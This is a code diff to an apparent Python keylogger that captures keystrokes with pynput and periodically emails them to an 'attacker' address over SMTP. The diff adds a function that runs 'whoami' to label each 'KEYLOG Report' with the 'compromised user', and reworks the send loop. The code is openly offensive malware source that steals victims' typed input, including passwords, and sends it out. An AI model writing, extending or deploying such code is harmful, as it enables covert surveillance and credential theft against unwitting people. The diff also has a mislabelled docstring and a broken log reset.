@@ -11,6 +11,7 @@ import smtplib
 import pynput
 import datetime
 import time
+import subprocess
 from threading import Thread
 
 """ 
@@ -56,7 +57,7 @@ def calculate_end_time(start_time, duration):
     month_days = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
 
     if(duration != None):
-        end_time = start_time
+        end_time = start_time.copy()
 
         leap_year = check_leap_year(end_time[4])
         if(leap_year):
@@ -154,6 +155,16 @@ def send_mail(email, password, report, report_email):
     server.quit()
 
 """ 
+* Function Name:  send_mail()
+* Input:          None
+* Output:         user (string): The compromised user. 
+* Logic:          The function runs the 'whoami' subprocess call to retrieve the username of the compromised user. 
+* Example Call:   user = get_user()
+"""
+def get_user():
+    return subprocess.check_output("whoami", shell=True).decode('utf-8')
+
+""" 
 * Function Name:  report()
 * Input:          report_email (string): Email id of the attacker to which the data should be sent.
 *                 interval (integer): The interval (in seconds) in which the outstanding logs should be sent to the attacker.
@@ -177,7 +188,11 @@ def report(report_email, interval, start_time, end_time, email, password):
 
         return copied_time
 
-    template = "LOG REPORT\n\n"
+    user = get_user()
+
+    template = "Subject: KEYLOG Report of USER: {}\n\n".format(user)
+    template += "KEYLOG REPORT\n\n"
+    template += "User: {}\n".format(user)
     template += "Start Time: {}:{}, {}/{}/{}\n".format(*format_time(start_time))
     template += "End Time: {}:{}, {}/{}/{}\n\n".format(*format_time(end_time))
 
@@ -185,7 +200,7 @@ def report(report_email, interval, start_time, end_time, email, password):
     current_time = get_current_time()
     current_time = datetime.datetime(*current_time[4:1:-1], current_time[0], current_time[1])
     
-    def format_report(interval, template, report_email, email, password):
+    def format_report(interval, template):
         global log
 
         intvl_st = get_current_time()
@@ -201,20 +216,22 @@ def report(report_email, interval, start_time, end_time, email, password):
         else:
             report += "NO LOGS DURING THIS INTERVAL."
 
-        log = ""
-
-        send_mail(email, password, report, report_email)
+        return report
 
     if(end_time != None):
         while(current_time < scheduled_end_time):
-            format_report(interval, template, report_email, email, password)
+            report = format_report(interval, template)
+            log = ""
+            send_mail(email, password, report, report_email)
 
             current_time = get_current_time()
             current_time = datetime.datetime(*current_time[4:1:-1], current_time[0], current_time[1])
         
     else:
         while True:
-            format_report(interval, template, report_email, email, password)
+            report = format_report(interval, template)
+            log = ""
+            send_mail(email, password, report, report_email)
 
 
 if __name__ == "__main__":
